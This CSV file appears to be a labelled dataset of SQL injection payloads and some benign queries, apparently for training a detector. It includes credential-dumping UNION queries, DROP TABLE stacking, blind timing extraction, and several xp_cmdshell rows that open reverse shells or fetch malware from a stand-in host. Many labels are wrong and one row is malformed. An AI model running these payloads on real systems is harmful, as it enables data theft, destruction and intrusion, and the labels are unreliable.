SQL Query,Injection Type,Vulnerability Status
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE customers;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '7'='7';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
UPDATE accounts SET balance=10000 WHERE id=''; EXEC sp_executesql N'DROP TABLE sales';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 0.25; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=140000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='5';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='8';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, email FROM employees;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE customers;--,Union-based,Yes
UPDATE accounts SET balance=7000 WHERE id=''; EXEC xp_cmdshell('nc -e /bin/bash malicious.com 4444');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '8'='8';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '9'='9';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('critical vulnerability found'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='deactivated' WHERE username='' OR '8'='8';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='5';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '8'='8';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 1200); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='inactive' WHERE user_id='' OR '8'='8';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '8'='8';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'compromised account'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='orange' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '8'='8';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE orders;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '8'='8';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE transactions;--,Time-based,Yes
UPDATE accounts SET balance=11000 WHERE id=''; EXEC sp_executesql N'DROP TABLE accounts';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 0.1; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=150000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='6';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='9';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT user_id, address FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE orders;--,Union-based,Yes
UPDATE accounts SET balance=8000 WHERE id=''; EXEC xp_cmdshell('curl http://malicious.com/malware');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '9'='9';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '10'='10';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('exploiting vulnerability'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='locked' WHERE username='' OR '9'='9';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='6';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '9'='9';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 1300); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='pending' WHERE user_id='' OR '9'='9';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE products;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '9'='9';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'hacked profile'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='grape' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '9'='9';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE employees;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '9'='9';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE users;--,Time-based,Yes
UPDATE accounts SET balance=12000 WHERE id=''; EXEC sp_executesql N'DROP TABLE transactions';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 0.05; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=160000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM sales;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='7';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='10';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, phone FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE suppliers;--,Union-based,Yes
UPDATE accounts SET balance=9000 WHERE id=''; EXEC xp_cmdshell('wget http://malicious.com/malware');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '10'='10';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '11'='11';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('security breach detected'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='frozen' WHERE username='' OR '10'='10';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='7';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '10'='10';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 1400); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='active' WHERE user_id='' OR '10'='10';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '10'='10';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'compromised account'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='melon' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '10'='10';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '10'='10';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE profiles;--,Time-based,Yes
UPDATE accounts SET balance=13000 WHERE id=''; EXEC sp_executesql N'DROP TABLE sales';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 0.01; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=170000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='8';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='11';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, address FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE sales;--,Union-based,Yes
UPDATE accounts SET balance=10000 WHERE id=''; EXEC xp_cmdshell('nc -e cmd.exe malicious.com 4444');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '11'='11';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM employees;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '12'='12';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('database vulnerability found'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='disabled' WHERE username='' OR '11'='11';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='8';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '11'='11';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 1500); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='suspended' WHERE user_id='' OR '11'='11';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE products;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '11'='11';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'hacked profile'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='peach' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '11'='11';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '11'='11';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE employees;--,Time-based,Yes
UPDATE accounts SET balance=14000 WHERE id=''; EXEC sp_executesql N'DROP TABLE transactions';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 0.005; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=180000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='9';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='12';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT first_name, last_name FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
UPDATE accounts SET balance=11000 WHERE id=''; EXEC xp_cmdshell('curl http://malicious.com/shell');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '12'='12';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '13'='13';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('malicious activity detected'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='locked' WHERE username='' OR '12'='12';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='9';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '12'='12';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 1600); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='inactive' WHERE user_id='' OR '12'='12';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE orders;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '12'='12';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'breached account'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='plum' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '12'='12';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '12'='12';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE profiles;--,Time-based,Yes
UPDATE accounts SET balance=15000 WHERE id=''; EXEC sp_executesql N'DROP TABLE sales';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 0.0001; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=190000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM sales;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='10';--,Boolean-based,Yes
SELECT * FROM users WHERE username='' AND password='' OR '1'='13';--,Boolean-based,Yes
"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, password FROM customers;--",Union-based,Yes
SELECT name FROM products WHERE id='1'; DROP TABLE promotions;--,Union-based,Yes
UPDATE accounts SET balance=12000 WHERE id=''; EXEC xp_cmdshell('bash -i >& /dev/tcp/malicious.com/4444 0>&1');--,Time-based,Yes
SELECT * FROM employees WHERE emp_id='' OR '13'='13';--,Boolean-based,Yes
DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
"SELECT email FROM customers WHERE email='' UNION SELECT username, credit_card FROM admins;--",Union-based,Yes
"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM sales;--",Union-based,Yes
SELECT * FROM products WHERE name='' OR '14'='14';--,Boolean-based,Yes
INSERT INTO logs (message) VALUES ('unauthorized access detected'); DROP TABLE logs;--,Time-based,Yes
UPDATE users SET status='frozen' WHERE username='' OR '13'='13';--,Boolean-based,Yes
SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM customers WHERE id='' OR '0'='10';--,Boolean-based,Yes
SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
SELECT * FROM items WHERE id='1' AND '13'='13';--,Boolean-based,Yes
"INSERT INTO orders (user_id, total) VALUES (1, 1700); DROP TABLE orders;--",Time-based,Yes
SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
UPDATE accounts SET status='pending' WHERE user_id='' OR '13'='13';--,Boolean-based,Yes
SELECT * FROM users WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM accounts WHERE username='' OR '13'='13';--,Boolean-based,Yes
"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
"INSERT INTO profiles (user_id, bio) VALUES (1, 'hacked data'); DROP TABLE profiles;--",Time-based,Yes
SELECT * FROM items WHERE name='berry' OR ''='';--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
DELETE FROM users WHERE username='' OR '13'='13';--,Boolean-based,Yes
SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
SELECT * FROM products WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
DELETE FROM customers WHERE email='' OR '13'='13';--,Boolean-based,Yes
"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
SELECT * FROM orders WHERE order_id='1'; DROP TABLE promotions;--,Time-based,Yes
UPDATE accounts SET balance=16000 WHERE id=''; EXEC sp_executesql N'DROP TABLE payments';--,Union-based,Yes
SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
SELECT * FROM products WHERE price < 0.00001; DROP TABLE prices;--,Time-based,Yes
UPDATE employees SET salary=200000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
DELETE FROM orders WHERE order_id='1' AND '1'='11';--,Boolean-based,Yes
SELECT * FROM users WHERE username=''; WAITFOR DELAY '00:00:10';--,Time-based,Yes
SELECT * FROM accounts WHERE user_id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END);--,Time-based,Yes
SELECT * FROM payments WHERE amount = '10',,pg_sleep(10);--
SELECT * FROM accounts WHERE balance = 100; AND 1=1--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id = 1 AND 'a' = 'b';--,Boolean-based,Yes
UPDATE products SET price=0 WHERE id=1; WAITFOR DELAY '00:00:05';--,Time-based,Yes
SELECT * FROM users WHERE id='1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM sysobjects WHERE type='U')>10 THEN pg_sleep(5) ELSE pg_sleep(0) END);--,Time-based,Yes
SELECT * FROM accounts WHERE balance = 100; AND SLEEP(5);--,Time-based,Yes
"SELECT * FROM orders WHERE order_id = 1; AND (SELECT IF(1=1, SLEEP(5), 0));--",Time-based,Yes
"SELECT * FROM products WHERE id = ''; UNION SELECT NULL, pg_sleep(10);--",Time-based,Yes
"SELECT * FROM orders WHERE order_id = ''; UNION ALL SELECT NULL, pg_sleep(10);--",Time-based,Yes
SELECT * FROM files WHERE file_id = 1; AND pg_sleep(10);--,Time-based,Yes
SELECT * FROM users WHERE id = ''; AND 1=1;--,Boolean-based,Yes
SELECT * FROM accounts WHERE balance = 100 AND 1=1;--,Boolean-based,Yes
SELECT * FROM orders WHERE order_id = ''; AND 1=2;--,Boolean-based,Yes
SELECT * FROM customers WHERE email = ''; AND 'x'='x';--,Boolean-based,Yes
SELECT * FROM employees WHERE emp_id = ''; AND 'x'='y';--,Boolean-based,Yes
SELECT * FROM users WHERE id = ''; AND LENGTH(username) > 5;--,Boolean-based,Yes
"SELECT * FROM accounts WHERE balance = 100 AND IF(1=1, 1, 0);--",Boolean-based,Yes
"SELECT * FROM orders WHERE id = ''; AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) = 97;--",Boolean-based,Yes
"SELECT * FROM employees WHERE emp_id = ''; AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), 1, 0);--",Boolean-based,Yes
"SELECT * FROM customers WHERE email = ''; AND IF(LENGTH((SELECT username FROM users LIMIT 1)) > 5, 1, 0);--",Boolean-based,Yes
"SELECT * FROM users WHERE id = ''; UNION SELECT NULL, NULL;--",Union-based,Yes
"SELECT * FROM products WHERE id = ''; UNION SELECT 1, 2;--",Union-based,Yes
"SELECT * FROM accounts WHERE id = ''; UNION SELECT version(), NULL;--",Union-based,Yes
"SELECT * FROM orders WHERE order_id = ''; UNION SELECT user(), database();--",Union-based,Yes
"SELECT * FROM employees WHERE emp_id = ''; UNION SELECT CURRENT_USER(), @@hostname;--",Union-based,Yes
SELECT * FROM customers WHERE email = ''; UNION SELECT table_name FROM information_schema.tables;--,Union-based,Yes
SELECT * FROM logs WHERE log_id = ''; UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users';--,Union-based,Yes
"SELECT * FROM payments WHERE payment_id = ''; UNION ALL SELECT @@version_comment, @@version_compile_os;--",Union-based,Yes
"SELECT * FROM users WHERE id = ''; UNION ALL SELECT NULL, SLEEP(5);--",Union-based,Yes
"SELECT * FROM accounts WHERE balance = 100; UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_type='BASE TABLE';--",Union-based,Yes
SELECT * FROM users WHERE id = ''; SLEEP(5);--,Time-based,Yes
SELECT * FROM orders WHERE order_id = ''; AND SLEEP(3);--,Time-based,Yes
SELECT * FROM accounts WHERE id = ''; OR SLEEP(2);--,Time-based,Yes
"SELECT * FROM products WHERE id = ''; AND IF(1=1, SLEEP(5), 0);--",Time-based,Yes
"SELECT * FROM customers WHERE email = ''; OR IF(EXISTS(SELECT 1 FROM users), SLEEP(5), 0);--",Time-based,Yes
"SELECT * FROM employees WHERE emp_id = ''; AND IF(LENGTH((SELECT password FROM users LIMIT 1)) > 5, SLEEP(5), 0);--",Time-based,Yes
"SELECT * FROM orders WHERE id = ''; OR IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) > 70, SLEEP(5), 0);--",Time-based,Yes
"SELECT * FROM accounts WHERE balance = 100; IF(1=1, SLEEP(10), 0);--",Time-based,Yes
"SELECT * FROM payments WHERE payment_id = ''; AND BENCHMARK(1000000, SHA1(1));--",Time-based,Yes
SELECT * FROM logs WHERE log_id = ''; UNION SELECT SLEEP(5);--,Time-based,Yes
SELECT * FROM users WHERE id = ''; AND 1/0;--,Error-based,Yes
SELECT * FROM products WHERE id = ''; AND (SELECT 1 FROM non_existent_table);--,Error-based,Yes
SELECT * FROM orders WHERE order_id = ''; AND EXP(1000);--,Error-based,Yes
SELECT * FROM accounts WHERE id = ''; AND (SELECT 1 FROM information_schema.tables WHERE table_name='non_existent');--,Error-based,Yes
SELECT * FROM customers WHERE email = ''; AND (SELECT 1 FROM non_existent_column);--,Error-based,Yes
"SELECT * FROM employees WHERE emp_id = ''; UNION SELECT NULL, CAST('test' AS INT);--",Error-based,Yes
SELECT * FROM logs WHERE log_id = ''; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='non_existent');--,Error-based,Yes
SELECT * FROM payments WHERE payment_id = ''; AND (SELECT 1/0);--,Error-based,Yes
"SELECT * FROM accounts WHERE id = ''; UNION SELECT NULL, EXP(999999999);--",Error-based,Yes
"SELECT * FROM users WHERE id = ''; AND (SELECT CONVERT('a', UNSIGNED INTEGER));--",Error-based,Yes
SELECT * FROM employees WHERE emp_id = 5;,None,No
SELECT * FROM orders WHERE order_date = '2023-01-01';,None,No
"SELECT name, price FROM products WHERE price > 100;",None,No
SELECT * FROM users WHERE username = 'admin';,None,No
DELETE FROM sessions WHERE session_id = 'abc123';,None,No
UPDATE accounts SET balance = 1000 WHERE account_id = 1;,None,No
SELECT * FROM transactions WHERE transaction_id = 12345;,None,No
"SELECT first_name, last_name FROM customers WHERE customer_id = 500;",None,No
"INSERT INTO orders (customer_id, product_id, quantity) VALUES (1, 100, 2);",None,No
SELECT * FROM payments WHERE payment_date = '2024-01-01';,None,No
SELECT * FROM logs WHERE log_date = CURRENT_DATE;,None,No
